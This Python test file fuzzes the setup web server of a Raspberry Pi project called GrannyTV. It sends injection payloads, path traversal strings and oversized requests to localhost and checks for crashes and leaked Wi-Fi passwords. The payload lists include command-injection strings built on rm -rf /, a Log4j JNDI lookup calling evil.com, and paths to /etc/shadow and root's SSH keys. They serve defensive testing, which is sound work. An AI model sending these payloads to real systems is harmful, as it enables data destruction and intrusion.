#!/usr/bin/env python3
"""
Security Validation Tests - TIER 1 CRITICAL
==========================================

These tests validate security aspects of the GrannyTV setup system.
Critical for production deployment to prevent security vulnerabilities.
"""
import time
import json


class TestWebServerSecurity:
    """Test web server security - TIER 1 CRITICAL"""
    
    def test_input_sanitization_comprehensive(self, execute_on_pi_root, execute_on_pi, cleanup_pi):
        """Test comprehensive input sanitization against injection attacks"""
        
        # Start setup web server
        result = execute_on_pi_root('sudo -u jeremy ./setup/setup-wizard.sh',
                                   cwd="/home/jeremy/gtv", timeout=120)
        assert result['success'], "Setup initialization failed"
        
        time.sleep(5)
        
        # SQL Injection attempts (even though we don't use SQL, test general injection)
        injection_payloads = [
            "'; DROP TABLE users; --",  
            "' OR '1'='1",
            "\"; rm -rf /; #",
            "<script>alert('xss')</script>",
            "../../etc/passwd",
            "${jndi:ldap://evil.com/a}",  # Log4j style
            "$(rm -rf /)",  # Command injection
            "|rm -rf /",
            ";rm -rf /",
            "`rm -rf /`",
            "\\x00\\x01\\x02",  # Null bytes
        ]
        
        for payload in injection_payloads:
            # Test in WiFi SSID field
            malicious_config = {
                "wifi_ssid": payload,
                "wifi_password": "SafePassword",
                "install_path": "/home/jeremy/gtv",
                "tv_name": "TestTV"
            }
            
            config_json = json.dumps(malicious_config).replace('"', '\\"')
            curl_cmd = f'curl -X POST -H "Content-Type: application/json" -d "{config_json}" http://localhost:8080/configure'
            result = execute_on_pi_root(curl_cmd, timeout=30)
            
            # Server should not crash from malicious input
            time.sleep(1)
            health_result = execute_on_pi_root('curl -f http://localhost:8080/ -o /dev/null', timeout=10) 
            assert health_result['success'], f"Server crashed on injection payload: {payload[:50]}"
            
            # Test in password field  
            malicious_config["wifi_ssid"] = "SafeSSID"
            malicious_config["wifi_password"] = payload
            
            config_json = json.dumps(malicious_config).replace('"', '\\"')
            curl_cmd = f'curl -X POST -H "Content-Type: application/json" -d "{config_json}" http://localhost:8080/configure'
            result = execute_on_pi_root(curl_cmd, timeout=30)
            
            # Server should still be running
            time.sleep(1)
            health_result = execute_on_pi_root('curl -f http://localhost:8080/ -o /dev/null', timeout=10)
            assert health_result['success'], f"Server crashed on password injection: {payload[:50]}"
    
    def test_file_upload_security(self, execute_on_pi_root, execute_on_pi, cleanup_pi):
        """Test file upload security and path traversal prevention"""
        
        # Start web server
        result = execute_on_pi_root('sudo -u jeremy ./setup/setup-wizard.sh',
                                   cwd="/home/jeremy/gtv", timeout=120)
        assert result['success'], "Setup failed"
        
        time.sleep(5)
        
        # Test malicious file paths in install_path
        malicious_paths = [
            "../../../etc/passwd",
            "/etc/shadow", 
            "../../../../root/.ssh/authorized_keys",
            "/var/log/auth.log",
            "../tmp/../../../etc/hosts",
            "/proc/version",
            "/sys/class/net",
            "file:///etc/passwd",
            "\\\\..\\\\..\\\\windows\\\\system32",  # Windows-style
        ]
        
        for malicious_path in malicious_paths:
            config_data = {
                "wifi_ssid": "TestNetwork",
                "wifi_password": "TestPassword", 
                "install_path": malicious_path,
                "tv_name": "TestTV"
            }
            
            config_json = json.dumps(config_data).replace('"', '\\"')
            curl_cmd = f'curl -X POST -H "Content-Type: application/json" -d "{config_json}" http://localhost:8080/configure'
            result = execute_on_pi_root(curl_cmd, timeout=30)
            
            # Server should reject or sanitize malicious paths
            time.sleep(1)
            
            # Verify no files were created in sensitive locations
            sensitive_check = execute_on_pi_root('ls -la /etc/passwd /etc/shadow /root/ 2>/dev/null | wc -l', timeout=10)
            # System should still be intact
            
            # Server should still be responsive
            health_result = execute_on_pi_root('curl -f http://localhost:8080/ -o /dev/null', timeout=10)
            assert health_result['success'], f"Server crashed on malicious path: {malicious_path}"
    
    def test_network_security_headers(self, execute_on_pi_root, execute_on_pi, cleanup_pi):
        """Test that web server includes appropriate security headers"""
        
        # Start web server
        result = execute_on_pi_root('sudo -u jeremy ./setup/setup-wizard.sh',
                                   cwd="/home/jeremy/gtv", timeout=120)
        assert result['success'], "Setup failed"
        
        time.sleep(5)
        
        # Check HTTP headers for security
        result = execute_on_pi_root('curl -I http://localhost:8080/', timeout=10)
        assert result['success'], "Cannot get HTTP headers"
        
        headers = result['stdout'].lower()
        
        # Check for basic security headers (not all may be present in simple Flask app)
        security_checks = [
            # These are recommendations, not strict requirements
            ("server header not revealed", "server:" not in headers or "flask" not in headers),
            ("headers received", len(headers) > 50),  # Basic header check
        ]
        
        for check_name, condition in security_checks:
            if not condition:
                print(f"Security recommendation: {check_name}")
                # Don't fail test, just log recommendations
    
    def test_rate_limiting_and_dos_protection(self, execute_on_pi_root, execute_on_pi, cleanup_pi):
        """Test protection against denial of service attacks"""
        
        # Start web server
        result = execute_on_pi_root('sudo -u jeremy ./setup/setup-wizard.sh',
                                   cwd="/home/jeremy/gtv", timeout=120)
        assert result['success'], "Setup failed"
        
        time.sleep(5)
        
        # Test rapid-fire requests (basic DoS test)
        for i in range(20):  # Moderate number to avoid overwhelming test environment
            result = execute_on_pi_root(f'curl -s http://localhost:8080/ -o /dev/null &', timeout=2)
            # Launch requests in background
        
        time.sleep(5)  # Let requests complete
        
        # Server should still be responsive after burst
        health_result = execute_on_pi_root('curl -f http://localhost:8080/ -o /dev/null', timeout=10)
        assert health_result['success'], "Server crashed under moderate load"
        
        # Test large request bodies
        large_data = '{"wifi_ssid":"' + 'A' * 10000 + '","wifi_password":"test","install_path":"/home/jeremy/gtv","tv_name":"test"}'
        large_data_escaped = large_data.replace('"', '\\"')
        curl_cmd = f'curl -X POST -H "Content-Type: application/json" -d "{large_data_escaped}" http://localhost:8080/configure'
        result = execute_on_pi_root(curl_cmd, timeout=30)
        
        # Server should handle large requests gracefully (either accept or reject, but not crash)
        time.sleep(2)
        health_result = execute_on_pi_root('curl -f http://localhost:8080/ -o /dev/null', timeout=10)
        assert health_result['success'], "Server crashed on large request"


class TestWiFiPasswordSecurity:
    """Test WiFi password handling security - TIER 1 CRITICAL"""
    
    def test_wifi_password_storage_security(self, execute_on_pi_root, execute_on_pi, cleanup_pi):
        """Test that WiFi passwords are stored securely"""
        
        # Start setup
        result = execute_on_pi_root('sudo -u jeremy ./setup/setup-wizard.sh',
                                   cwd="/home/jeremy/gtv", timeout=120)
        assert result['success'], "Setup failed"
        
        time.sleep(5)
        
        # Submit configuration with sensitive password
        sensitive_password = "SuperSecret123!@#$%^&*()"
        config_data = {
            "wifi_ssid": "TestNetwork",
            "wifi_password": sensitive_password,
            "install_path": "/home/jeremy/gtv",
            "tv_name": "SecurityTest"
        }
        
        config_json = json.dumps(config_data).replace('"', '\\"')
        curl_cmd = f'curl -X POST -H "Content-Type: application/json" -d "{config_json}" http://localhost:8080/configure'
        result = execute_on_pi_root(curl_cmd, timeout=30)
        
        time.sleep(3)
        
        # Check that password is not stored in plain text in logs
        result = execute_on_pi_root('grep -r "SuperSecret123" /tmp/ /var/log/ /home/jeremy/gtv/ 2>/dev/null || echo "not-found"', timeout=10)
        assert 'not-found' in result.get('stdout', ''), "WiFi password found in plain text in logs/files"
        
        # Check web server logs don't contain password
        result = execute_on_pi_root('grep -i "supersecret" /tmp/setup_server.log 2>/dev/null || echo "not-in-logs"', timeout=10)
        assert 'not-in-logs' in result.get('stdout', ''), "WiFi password leaked in web server logs"
        
        # Verify configuration file doesn't contain plain text password
        result = execute_on_pi_root('cat /home/jeremy/gtv/wifi_config.json 2>/dev/null || echo "missing"', timeout=10)
        if 'missing' not in result.get('stdout', ''):
            config_content = result['stdout']
            # Password might be present but should ideally be hashed/encrypted
            # This is a security recommendation test
            if sensitive_password in config_content:
                print("SECURITY RECOMMENDATION: WiFi password stored in plain text")
                # Don't fail test as this might be acceptable for home use
    
    def test_wifi_password_memory_handling(self, execute_on_pi_root, execute_on_pi, cleanup_pi):
        """Test that WiFi passwords are not left in memory dumps"""
        
        # Start setup
        result = execute_on_pi_root('sudo -u jeremy ./setup/setup-wizard.sh',
                                   cwd="/home/jeremy/gtv", timeout=120)
        assert result['success'], "Setup failed"
        
        time.sleep(5)
        
        # Submit configuration
        test_password = "MemoryTest12345"
        config_data = {
            "wifi_ssid": "MemoryTestNetwork",
            "wifi_password": test_password,
            "install_path": "/home/jeremy/gtv",
            "tv_name": "MemoryTest"
        }
        
        config_json = json.dumps(config_data).replace('"', '\\"')
        curl_cmd = f'curl -X POST -H "Content-Type: application/json" -d "{config_json}" http://localhost:8080/configure'
        result = execute_on_pi_root(curl_cmd, timeout=30)
        
        time.sleep(3)
        
        # Check process memory doesn't contain password (basic check)
        result = execute_on_pi_root('ps aux | grep setup_server.py | grep -v grep', timeout=10)
        if result['success'] and result['stdout'].strip():
            # Get process ID
            pid_result = execute_on_pi_root('pgrep -f setup_server.py', timeout=10)
            if pid_result['success'] and pid_result['stdout'].strip():
                pid = pid_result['stdout'].strip().split('\n')[0]
                
                # Basic memory check (this might not work in all environments)
                mem_result = execute_on_pi_root(f'grep -a "MemoryTest12345" /proc/{pid}/environ /proc/{pid}/cmdline 2>/dev/null || echo "not-in-proc"', timeout=10)
                # This is more of a security awareness test than a strict requirement


class TestSetupModeSecurity:
    """Test setup mode security - TIER 1 CRITICAL"""
    
    def test_setup_mode_timeout_enforcement(self, execute_on_pi_root, cleanup_pi):
        """Test that setup mode has security timeouts"""
        
        # Start setup mode
        result = execute_on_pi_root('sudo -u jeremy ./setup/setup-wizard.sh',
                                   cwd="/home/jeremy/gtv", timeout=120)
        assert result['success'], "Setup failed"
        
        time.sleep(5)
        
        # Verify web server is accessible
        result = execute_on_pi_root('curl -f http://localhost:8080/ -o /dev/null', timeout=10)
        assert result['success'], "Setup web server not accessible"
        
        # In production, setup mode should have a timeout
        # This test documents the security requirement
        print("SECURITY REQUIREMENT: Setup mode should timeout after reasonable period (e.g., 30 minutes)")
        print("SECURITY REQUIREMENT: Setup hotspot should automatically disable after timeout")
        print("SECURITY REQUIREMENT: Unauthorized access should be prevented after timeout")
        
        # This is more of a documentation/requirement test
        # Implementation would depend on production environment
    
    def test_unauthorized_access_prevention(self, execute_on_pi_root, execute_on_pi, cleanup_pi):
        """Test prevention of unauthorized access during setup"""
        
        # Start setup
        result = execute_on_pi_root('sudo -u jeremy ./setup/setup-wizard.sh',
                                   cwd="/home/jeremy/gtv", timeout=120)
        assert result['success'], "Setup failed"
        
        time.sleep(5)
        
        # Test that only expected endpoints are accessible
        endpoints_to_test = [
            ("/", True),          # Main setup page - should be accessible
            ("/configure", False), # POST only - GET should be rejected or redirected
            ("/finalize", False),  # POST only
            ("/admin", False),     # Should not exist
            ("/root", False),      # Should not exist
            ("/../etc/passwd", False),  # Path traversal
            ("/setup/../../../etc/passwd", False),  # Path traversal
        ]
        
        for endpoint, should_be_accessible in endpoints_to_test:
            result = execute_on_pi_root(f'curl -s -o /dev/null -w "%{{http_code}}" http://localhost:8080{endpoint}', timeout=10)
            if result['success']:
                status_code = result['stdout'].strip()
                
                if should_be_accessible:
                    assert status_code.startswith('2'), f"Expected endpoint {endpoint} should be accessible, got {status_code}"
                else:
                    assert not status_code.startswith('2'), f"Unexpected endpoint {endpoint} is accessible with status {status_code}"
            else:
                # If curl fails, that might be acceptable for unauthorized endpoints
                if should_be_accessible:
                    assert False, f"Expected accessible endpoint {endpoint} failed: {result}"


class TestDataValidationSecurity:
    """Test data validation security - TIER 1 CRITICAL"""
    
    def test_configuration_data_validation(self, execute_on_pi_root, execute_on_pi, cleanup_pi):
        """Test that configuration data is properly validated"""
        
        # Start setup
        result = execute_on_pi_root('sudo -u jeremy ./setup/setup-wizard.sh',
                                   cwd="/home/jeremy/gtv", timeout=120)
        assert result['success'], "Setup failed"
        
        time.sleep(5)
        
        # Test various invalid configurations
        invalid_configs = [
            {
                "name": "empty_fields",
                "data": {"wifi_ssid": "", "wifi_password": "", "install_path": "", "tv_name": ""},
                "should_reject": True
            },
            {
                "name": "null_values",
                "data": {"wifi_ssid": None, "wifi_password": None, "install_path": None, "tv_name": None},
                "should_reject": True
            },
            {
                "name": "wrong_types",
                "data": {"wifi_ssid": 123, "wifi_password": [], "install_path": {}, "tv_name": True},
                "should_reject": True
            },
            {
                "name": "missing_required",
                "data": {"wifi_ssid": "TestSSID"},  # Missing other required fields
                "should_reject": True
            },
            {
                "name": "extra_fields",
                "data": {
                    "wifi_ssid": "TestSSID",
                    "wifi_password": "TestPass",
                    "install_path": "/home/jeremy/gtv",
                    "tv_name": "TestTV",
                    "malicious_field": "rm -rf /",
                    "injection": "'; DROP TABLE users; --"
                },
                "should_accept": True  # Extra fields should be ignored safely
            }
        ]
        
        for config_test in invalid_configs:
            config_json = json.dumps(config_test["data"]).replace('"', '\\"')
            curl_cmd = f'curl -X POST -H "Content-Type: application/json" -d "{config_json}" http://localhost:8080/configure'
            result = execute_on_pi_root(curl_cmd, timeout=30)
            
            # Server should handle invalid data gracefully (not crash)
            time.sleep(1)
            health_result = execute_on_pi_root('curl -f http://localhost:8080/ -o /dev/null', timeout=10)
            assert health_result['success'], f"Server crashed on {config_test['name']} validation test"
            
            if config_test.get("should_reject", False):
                print(f"VALIDATION TEST: {config_test['name']} - Server should reject invalid data")
            elif config_test.get("should_accept", False):
                print(f"VALIDATION TEST: {config_test['name']} - Server should accept but sanitize data")